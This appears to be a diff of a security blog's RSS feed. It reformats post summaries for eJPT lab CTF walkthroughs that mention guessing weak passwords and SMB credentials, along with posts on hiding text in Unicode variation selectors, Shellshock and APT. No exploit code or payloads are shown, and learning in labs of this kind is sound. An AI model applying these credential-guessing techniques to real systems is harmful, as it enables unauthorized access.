+            <description>Continuing on with my eJPT certification, this time we&amp;rsquo;ll tackle the second CTF in the System-Host Based Attacks course.
+In this lab we&amp;rsquo;re provided with two machine; target-1 and target-2. And we have 4 flags to capture :
+Flag 1: Check the root (&amp;rsquo;/&amp;rsquo;) directory for a file that might hold the key to the first flag on target1.ine.local. Flag 2: In the server&amp;rsquo;s root directory, there might be something hidden.</description>
             <content type="html"><![CDATA[<p>Continuing on with my eJPT certification, this time we&rsquo;ll tackle the second CTF in the  <em>System-Host Based Attacks</em> course.</p>
 <p>In this lab we&rsquo;re provided with two machine; target-1 and target-2. And we have 4 flags to capture :</p>
 <ul>
@@ -1044,14 +1334,8 @@ After navigating to the /etc/cron.d directory, we find two jobs and one of them 
             <pubDate>Sun, 30 Mar 2025 23:00:53 +0000</pubDate>
             
             <guid>/posts/ine_ctf_2/</guid>
-            <description>&lt;p&gt;Today, a second CTF walkthrough for the &lt;em&gt;System-Host Based Attacks CTF 1&lt;/em&gt;. This time we have 4 flags :&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;strong&gt;Flag 1&lt;/strong&gt;: User &amp;lsquo;bob&amp;rsquo; might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 2&lt;/strong&gt;: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 3&lt;/strong&gt;: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 4&lt;/strong&gt;: The Desktop directory might have what you&amp;rsquo;re looking for. Enumerate its contents. (target2.ine.local)&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Judging from the tasks descriptions, we notice that we have 2 targets that are most likely Windows targets; The second flag mentions a C drive and the third talks about SMB so we can confidently assume that we&amp;rsquo;ll be subject to Windows targets.&lt;/p&gt;</description>
+            <description>Today, a second CTF walkthrough for the System-Host Based Attacks CTF 1. This time we have 4 flags :
+Flag 1: User &amp;lsquo;bob&amp;rsquo; might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local) Flag 2: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local) Flag 3: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag.</description>
             <content type="html"><![CDATA[<p>Today, a second CTF walkthrough for the <em>System-Host Based Attacks CTF 1</em>. This time we have 4 flags :</p>
 <ol>
 <li><strong>Flag 1</strong>: User &lsquo;bob&rsquo; might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)</li>
@@ -1151,55 +1435,53 @@ After navigating to the /etc/cron.d directory, we find two jobs and one of them 
             <pubDate>Wed, 19 Mar 2025 21:00:47 +0000</pubDate>
             
             <guid>/posts/hide_emoji/</guid>
-            <description>&lt;p&gt;I recently stumbled upon an article titled &lt;a href=&#34;https://slamdunksoftware.substack.com/p/hidden-messages-in-emojis-and-hacking&#34;&gt;Hidden Messages in Emojis and Hacking the US Treasury&lt;/a&gt; and it reminded me of a &lt;a href=&#34;https://github.com/Yassine-elhammoumi/Unicode_character_encoding&#34;&gt;piece of code&lt;/a&gt; i wrote back in February 2025 about Unicode character encoding and how we could hide text inside a single character to hide a message inside of it, if we wanted to.
-I was able to do that thanks to the Unicode Variation Selectors.&lt;/p&gt;
-&lt;h2 id=&#34;unicode-variation-selectors&#34;&gt;Unicode variation selectors&lt;/h2&gt;
-&lt;p&gt;Variation selectors are special characters in the Unicode standard that modify the appearance of preceding characters. They are often used in situations where slight variations in character rendering are needed, such as choosing between different glyph styles.&lt;/p&gt;</description>
+            <description>I recently stumbled upon an article titled Hidden Messages in Emojis and Hacking the US Treasury and it reminded me of a piece of code i wrote back in February 2025 about Unicode character encoding and how we could hide text inside a single character to hide a message inside of it, if we wanted to. I was able to do that thanks to the Unicode Variation Selectors.
+Unicode variation selectors Variation selectors are special characters in the Unicode standard that modify the appearance of preceding characters.</description>
             <content type="html"><![CDATA[<p>I recently stumbled upon an article titled <a href="https://slamdunksoftware.substack.com/p/hidden-messages-in-emojis-and-hacking">Hidden Messages in Emojis and Hacking the US Treasury</a> and it reminded me of a <a href="https://github.com/Yassine-elhammoumi/Unicode_character_encoding">piece of code</a> i wrote back in February 2025 about Unicode character encoding and how we could hide text inside a single character to hide a message inside of it, if we wanted to.
 I was able to do that thanks to the Unicode Variation Selectors.</p>
 <h2 id="unicode-variation-selectors">Unicode variation selectors</h2>
 <p>Variation selectors are special characters in the Unicode standard that modify the appearance of preceding characters. They are often used in situations where slight variations in character rendering are needed, such as choosing between different glyph styles.</p>
 <p>For example in the case of emojis : (<a href="https://en.wikipedia.org/wiki/Hearts_in_Unicode">source</a>)</p>
 <table>
-  <thead>
-      <tr>
-          <th>Glyph</th>
-          <th>Description</th>
-          <th>Unicode</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>☑︎</td>
-          <td>U+2611 BALLOT BOX WITH CHECK in explicit text style</td>
-          <td><code>U+2611 U+FE0E</code> (VS15)</td>
-      </tr>
-      <tr>
-          <td>☑️</td>
-          <td>U+2611 BALLOT BOX WITH CHECK in explicit emoji style</td>
-          <td><code>U+2611 U+FE0F</code> (VS16)</td>
-      </tr>
-      <tr>
-          <td>✉︎</td>
-          <td>U+2709 ENVELOPE in explicit text style</td>
-          <td><code>U+2709 U+FE0E</code> (VS15)</td>
-      </tr>
-      <tr>
-          <td>✉️</td>
-          <td>U+2709 ENVELOPE in explicit emoji style</td>
-          <td><code>U+2709 U+FE0F</code> (VS16)</td>
-      </tr>
-      <tr>
-          <td>✔︎</td>
-          <td>U+2714 HEAVY CHECK MARK in explicit text style</td>
-          <td><code>U+2714 U+FE0E</code> (VS15)</td>
-      </tr>
-      <tr>
-          <td>✔️</td>
-          <td>U+2714 HEAVY CHECK MARK in explicit emoji style</td>
-          <td><code>U+2714 U+FE0F</code> (VS16)</td>
-      </tr>
-  </tbody>
+<thead>
+<tr>
+<th>Glyph</th>
+<th>Description</th>
+<th>Unicode</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>☑︎</td>
+<td>U+2611 BALLOT BOX WITH CHECK in explicit text style</td>
+<td><code>U+2611 U+FE0E</code> (VS15)</td>
+</tr>
+<tr>
+<td>☑️</td>
+<td>U+2611 BALLOT BOX WITH CHECK in explicit emoji style</td>
+<td><code>U+2611 U+FE0F</code> (VS16)</td>
+</tr>
+<tr>
+<td>✉︎</td>
+<td>U+2709 ENVELOPE in explicit text style</td>
+<td><code>U+2709 U+FE0E</code> (VS15)</td>
+</tr>
+<tr>
+<td>✉️</td>
+<td>U+2709 ENVELOPE in explicit emoji style</td>
+<td><code>U+2709 U+FE0F</code> (VS16)</td>
+</tr>
+<tr>
+<td>✔︎</td>
+<td>U+2714 HEAVY CHECK MARK in explicit text style</td>
+<td><code>U+2714 U+FE0E</code> (VS15)</td>
+</tr>
+<tr>
+<td>✔️</td>
+<td>U+2714 HEAVY CHECK MARK in explicit emoji style</td>
+<td><code>U+2714 U+FE0F</code> (VS16)</td>
+</tr>
+</tbody>
 </table>
 <p>We see that they are pretty much the same but with different formating thanks to the variation selectors.</p>
 <p>We use these variation selectors in other contexts too, such as:</p>
@@ -1295,12 +1577,9 @@ I had a lot of fun discovering all of this and making it work and I hope you too
             <pubDate>Mon, 17 Mar 2025 23:59:52 +0000</pubDate>
             
             <guid>/posts/shellshock/</guid>
-            <description>&lt;h2 id=&#34;what-is-shellshock-cve-2014-6271&#34;&gt;What is Shellshock (CVE-2014-6271)?&lt;/h2&gt;
-&lt;p&gt;Basically, Shellshock is a &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2014-6271&#34;&gt;critical&lt;/a&gt; vulnerability in Bash (versions 1.03 through 4.3) that allows attackers to perform arbitrary commands executions due to a flaw in Bash&amp;rsquo;s handling of environment variables.&lt;/p&gt;
-&lt;h3 id=&#34;environment-variables-&#34;&gt;Environment variables ?&lt;/h3&gt;
-&lt;p&gt;Environment variables are a simple way to pass about the current operating environment to the program being executed. You can define one simply by typing :&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;variable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And you can use it as you would use a variable in a programming language.&lt;/p&gt;</description>
+            <description>What is Shellshock (CVE-2014-6271)? Basically, Shellshock is a critical vulnerability in Bash (versions 1.03 through 4.3) that allows attackers to perform arbitrary commands executions due to a flaw in Bash&amp;rsquo;s handling of environment variables.
+Environment variables ? Environment variables are a simple way to pass about the current operating environment to the program being executed. You can define one simply by typing :
+variable=&amp;#34;test&amp;#34; And you can use it as you would use a variable in a programming language.</description>
             <content type="html"><![CDATA[<h2 id="what-is-shellshock-cve-2014-6271">What is Shellshock (CVE-2014-6271)?</h2>
 <p>Basically, Shellshock is a <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">critical</a> vulnerability in Bash (versions 1.03 through 4.3) that allows attackers to perform arbitrary commands executions due to a flaw in Bash&rsquo;s handling of environment variables.</p>
 <h3 id="environment-variables-">Environment variables ?</h3>
@@ -1384,13 +1663,10 @@ I had a lot of fun discovering all of this and making it work and I hope you too
             <pubDate>Sun, 16 Mar 2025 20:52:36 +0000</pubDate>
             
             <guid>/posts/vulnerability_assessment_ctf_1/</guid>
-            <description>&lt;p&gt;Today we&amp;rsquo;re going to write about my attempt at solving the &lt;em&gt;&amp;ldquo;Assessment Methodologies: Vulnerability Assessment CTF 1&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;Before trying to capture any flags, I started by doing a quick nmap scan on the local network to identify the target.&lt;/p&gt;
-
-    &lt;img src=&#34;/screens/nmap-1.png&#34;  alt=&#34;First nmap scan&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px; width: 70%;&#34;  /&gt;
-
-
-&lt;p&gt;We can see that the ports &lt;strong&gt;80&lt;/strong&gt; and &lt;strong&gt;3306&lt;/strong&gt; are open on the host&amp;rsquo;s IP &lt;strong&gt;192.194.77.3&lt;/strong&gt; so it must be our target (the &lt;em&gt;target.ine.local&lt;/em&gt; helps too).&lt;/p&gt;</description>
+            <description>Today we&amp;rsquo;re going to write about my attempt at solving the &amp;ldquo;Assessment Methodologies: Vulnerability Assessment CTF 1&amp;rdquo;
+Before trying to capture any flags, I started by doing a quick nmap scan on the local network to identify the target.
+We can see that the ports 80 and 3306 are open on the host&amp;rsquo;s IP 192.194.77.3 so it must be our target (the target.ine.local helps too).
+I then opened the browser to look at the web server (since port 80 is open) and I found an OWASP app.</description>
             <content type="html"><![CDATA[<p>Today we&rsquo;re going to write about my attempt at solving the <em>&ldquo;Assessment Methodologies: Vulnerability Assessment CTF 1&rdquo;</em></p>
 <p>Before trying to capture any flags, I started by doing a quick nmap scan on the local network to identify the target.</p>
 
@@ -1507,14 +1783,12 @@ I had a lot of fun discovering all of this and making it work and I hope you too
             <pubDate>Fri, 14 Mar 2025 00:02:13 +0000</pubDate>
             
             <guid>/posts/apt/</guid>
-            <description>&lt;p&gt;You must’ve stumbled upon this command while reading online tutorials on how to install software, and we’ve all copy-pasted the command without a second thought because it works well most of the time and is an easy, convenient way to install/update software.
-Today I’ll dive deeper on the intricacies of this command.&lt;/p&gt;
-&lt;h2 id=&#34;what-is-apt-package-manager&#34;&gt;What is APT Package Manager&lt;/h2&gt;
-&lt;p&gt;The &lt;a href=&#34;https://en.wikipedia.org/wiki/APT_%28software%29&#34;&gt;Advanced Package Tool&lt;/a&gt; (APT) is a free utility that lets user install, update and manage software packages. These packages are bundled in repositories, which are external sources containing software that users can install. APT simplifies the interaction with these repositories and automates the management of dependencies.&lt;/p&gt;</description>
+            <description>You must’ve stumbled upon this command while reading online tutorials on how to install software, and we’ve all copy-pasted the command without a second thought because it works well most of the time and is an easy, convenient way to install/update software. Today I’ll dive deeper on the intricacies of this command.
+What is APT Package Manager The Advanced Package Tool (APT) is a free utility that lets user install, update and manage software packages.</description>
             <content type="html"><![CDATA[<p>You must’ve stumbled upon this command while reading online tutorials on how to install software, and we’ve all copy-pasted the command without a second thought because it works well most of the time and is an easy, convenient way to install/update software.
 Today I’ll dive deeper on the intricacies of this command.</p>
 <h2 id="what-is-apt-package-manager">What is APT Package Manager</h2>
-<p>The <a href="https://en.wikipedia.org/wiki/APT_%28software%29">Advanced Package Tool</a> (APT) is a free utility that lets user install, update and manage software packages. These packages are bundled in repositories, which are external sources containing software that users can install. APT simplifies the interaction with these repositories and automates the management of dependencies.</p>
+<p>The <a href="https://en.wikipedia.org/wiki/APT_(software)">Advanced Package Tool</a> (APT) is a free utility that lets user install, update and manage software packages. These packages are bundled in repositories, which are external sources containing software that users can install. APT simplifies the interaction with these repositories and automates the management of dependencies.</p>
 <p>APT came as a way to resolve dependency issues and is often hailed as one of Debian&rsquo;s best features.</p>
 <h3 id="apt-or-apt-get-whats-the-difference">apt or apt-get? What&rsquo;s the difference?</h3>
 <h4 id="a-brief-history">A brief history</h4>
@@ -1560,7 +1834,7 @@ Today I’ll dive deeper on the intricacies of this command.</p>
 <hr>
 <p>To install a specific version of a package, you can add the version following an &ldquo;=&rdquo; :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install package-name<span style="color:#f92672">=</span>package_version
-</span></span></code></pre></div><p>You can even easily install <a href="https://en.wikipedia.org/wiki/Deb_%28file_format%29">.deb</a> packages :</p>
+</span></span></code></pre></div><p>You can even easily install <a href="https://en.wikipedia.org/wiki/Deb_(file_format)">.deb</a> packages :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install ./debian-package.deb
 </span></span></code></pre></div><h3 id="removing-packages">Removing Packages</h3>
 <p>Similarly to installing, removing packages is pretty straith foreward :</p>
